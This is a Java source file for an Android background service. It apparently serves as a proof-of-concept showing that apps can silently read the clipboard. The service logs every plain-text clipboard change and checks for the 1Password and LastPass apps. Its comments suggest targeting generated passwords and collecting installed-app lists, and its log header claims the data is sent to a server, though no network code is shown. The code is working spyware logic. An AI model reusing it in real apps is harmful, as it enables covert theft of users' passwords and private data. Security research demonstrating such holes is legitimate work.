package com.grepx.androidsecurityhole;

import android.app.Service;
import android.content.ClipData;
import android.content.ClipDescription;
import android.content.ClipboardManager;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.IBinder;

import java.util.List;

public class ClipboardWatcherService extends Service {

    public static final StringBuilder log = new StringBuilder("--- STUFF THAT I SENT TO MY SERVER ---\n\n");
    public static boolean serviceIsRunning = false;

    private ClipboardManager.OnPrimaryClipChangedListener listener = new ClipboardManager.OnPrimaryClipChangedListener() {
        public void onPrimaryClipChanged() {
            performClipboardCheck();
        }
    };

    @Override
    public void onCreate() {
        ((ClipboardManager) getSystemService(CLIPBOARD_SERVICE)).addPrimaryClipChangedListener(listener);
        checkForPasswordManager();
        serviceIsRunning = true;
    }

    /**
     * Checks to see if a password manager is installed and logs it.
     * <p/>
     * In a real app, more advanced optimisation would be possible using this information.
     * For example, detect passwords that match the default generation settings for that manager.
     * <p/>
     * You could also transmit a full list of apps installed on the device to know which services
     * the user uses.
     */
    private void checkForPasswordManager() {
        final PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        for (ApplicationInfo packageInfo : packages) {
            if (packageInfo.packageName.equals("com.agilebits.onepassword") ||
                        packageInfo.packageName.equals("com.lastpass.lpandroid")) {
                log.append(packageInfo.packageName);
                log.append(" is installed.\n\n");
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void performClipboardCheck() {
        ClipboardManager cb = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        if (cb.hasPrimaryClip()) {
            ClipData cd = cb.getPrimaryClip();
            if (cd.getDescription().hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN)) {
                String clipboard = cd.getItemAt(0).getText().toString();
                log.append(clipboard);
                log.append("\n\n");
            }
        }
    }
}
